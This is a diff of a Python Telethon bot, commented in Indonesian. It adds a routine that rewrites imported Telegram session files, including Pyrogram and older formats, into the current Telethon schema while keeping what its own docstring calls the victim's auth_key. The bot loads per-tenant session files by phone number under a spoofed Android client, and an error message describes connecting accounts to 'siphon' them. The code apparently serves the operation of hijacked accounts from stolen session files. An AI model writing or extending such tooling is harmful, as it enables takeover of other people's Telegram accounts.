@@ -7,20 +7,78 @@ if sys.platform == "win32":
 
 def optimize_sqlite_session(session_path):
     """
-    Mengaktifkan WAL mode dan busy_timeout pada file SQLite Telethon .session
-    agar mendukung pembacaan dan penulisan konkuren tanpa error 'database is locked'.
+    1. Mengaktifkan WAL mode dan busy_timeout agar mendukung akses konkuren tanpa 'database is locked'.
+    2. Mendeteksi dan mereparasi tabel 'sessions' jika tidak sesuai format standar Telethon
+       (misal: sesi lama 6 kolom dengan 'tmp_auth_key' atau skema Pyrogram),
+       menyesuaikannya menjadi 5 kolom resmi Telethon 1.42+ (version=7) tanpa merusak auth_key korban.
     """
     if not session_path:
-        return
+        return False
     db_file = session_path if session_path.endswith(".session") else f"{session_path}.session"
-    if os.path.exists(db_file):
-        try:
-            with sqlite3.connect(db_file, timeout=15) as conn:
-                conn.execute("PRAGMA journal_mode=WAL;")
-                conn.execute("PRAGMA synchronous=NORMAL;")
-                conn.execute("PRAGMA busy_timeout=30000;")
-        except Exception:
-            pass
+    if not os.path.exists(db_file):
+        return False
+    
+    repaired = False
+    try:
+        with sqlite3.connect(db_file, timeout=15) as conn:
+            conn.execute("PRAGMA journal_mode=WAL;")
+            conn.execute("PRAGMA synchronous=NORMAL;")
+            conn.execute("PRAGMA busy_timeout=30000;")
+
+            cursor = conn.cursor()
+            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='sessions'")
+            if cursor.fetchone():
+                cursor.execute("PRAGMA table_info(sessions);")
+                cols = cursor.fetchall()
+                col_names = [c[1] for c in cols]
+
+                # Telethon resmi standar: ['dc_id', 'server_address', 'port', 'auth_key', 'takeout_id']
+                if len(col_names) != 5 or col_names != ['dc_id', 'server_address', 'port', 'auth_key', 'takeout_id']:
+                    cursor.execute("SELECT * FROM sessions LIMIT 1;")
+                    raw_row = cursor.fetchone()
+                    if raw_row:
+                        row_dict = dict(zip(col_names, raw_row))
+                        dc_id = row_dict.get('dc_id', 1)
+                        auth_key = row_dict.get('auth_key', None)
+
+                        dc_ips = {
+                            1: "149.154.175.50",
+                            2: "149.154.167.51",
+                            3: "149.154.175.100",
+                            4: "149.154.167.91",
+                            5: "91.108.56.164",
+                        }
+                        server_address = row_dict.get('server_address') or dc_ips.get(dc_id, "149.154.167.51")
+                        port = row_dict.get('port') or 443
+                        takeout_id = row_dict.get('takeout_id', None)
+                        if isinstance(takeout_id, (bytes, bytearray)) and len(takeout_id) == 0:
+                            takeout_id = None
+
+                        if auth_key and len(auth_key) > 0:
+                            cursor.execute("DROP TABLE sessions;")
+                            cursor.execute("""
+                                CREATE TABLE sessions (
+                                    dc_id integer primary key,
+                                    server_address text,
+                                    port integer,
+                                    auth_key blob,
+                                    takeout_id integer
+                                );
+                            """)
+                            cursor.execute(
+                                "INSERT INTO sessions VALUES (?, ?, ?, ?, ?);",
+                                (dc_id, server_address, port, auth_key, takeout_id)
+                            )
+                            # Update table version ke 7
+                            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='version'")
+                            if cursor.fetchone():
+                                cursor.execute("DELETE FROM version;")
+                                cursor.execute("INSERT INTO version VALUES (7);")
+                            conn.commit()
+                            repaired = True
+    except Exception as e:
+        print(f"[!] Error in optimize_sqlite_session for {db_file}: {e}")
+    return repaired
 
 from telethon.sync import TelegramClient, Button, events
 from telethon import TelegramClient, events, types, errors
@@ -693,19 +751,27 @@ async def handle_new_message(event):
                 
                 session_user_path = os.path.join(path, "sessions", f"tenant_{tenant_id}", "users")
                 os.makedirs(session_user_path, exist_ok=True)
+                session_target = os.path.join(session_user_path, nomor)
+                optimize_sqlite_session(session_target)
                 from telethon.network import connection
-                akun = TelegramClient(
-                    os.path.join(session_user_path, nomor),
-                    api_id,
-                    api_hash,
-                    device_model=device_model,
-                    system_version="Android 13",
-                    app_version="11.9.2",
-                    lang_code="en",
-                    system_lang_code="en",
-                    connection=connection.ConnectionTcpIntermediate
-                )
-                await akun.connect()
+                try:
+                    akun = TelegramClient(
+                        session_target,
+                        api_id,
+                        api_hash,
+                        device_model=device_model,
+                        system_version="Android 13",
+                        app_version="11.9.2",
+                        lang_code="en",
+                        system_lang_code="en",
+                        connection=connection.ConnectionTcpIntermediate
+                    )
+                    await akun.connect()
+                except Exception as e:
+                    print(f"[!] Gagal menghubungkan akun untuk sedot ({nomor}): {e}")
+                    await event.reply(f"⚠️ Gagal menghubungkan sesi akun: {e}")
+                    del waiting_for_link[user_id]
+                    return
                 link = code_match.group(1)
                 
                 # Validate link
@@ -948,16 +1014,27 @@ async def callback_handler(event):
     session_file = os.path.join(session_user_path, phonenumber)
     optimize_sqlite_session(session_file)
 
-    acd = TelegramClient(
-        session_file,
-        api_id,
-        api_hash,
-        device_model=device_model,
-        system_version="Android 13",
-        app_version="11.9.2",
-        lang_code="en",
-        system_lang_code="en"
-    )
+    try:
+        acd = TelegramClient(
+            session_file,
+            api_id,
+            api_hash,
+            device_model=device_model,
+            system_version="Android 13",
+            app_version="11.9.2",
+            lang_code="en",
+            system_lang_code="en"
+        )
+    except Exception as e:
+        print(f"[!] Gagal inisialisasi session {phonenumber}: {e}")
+        try:
+            await event.answer(f"⚠️ File sesi tidak kompatibel / rusak: {e}", alert=True)
+        except Exception:
+            try:
+                await event.edit(f"⚠️ File sesi `{phonenumber}` tidak dapat dimuat: {e}", buttons=[Button.inline("OK", "delete")])
+            except Exception:
+                pass
+        return
 
     connected = False
     for conn_try in range(3):
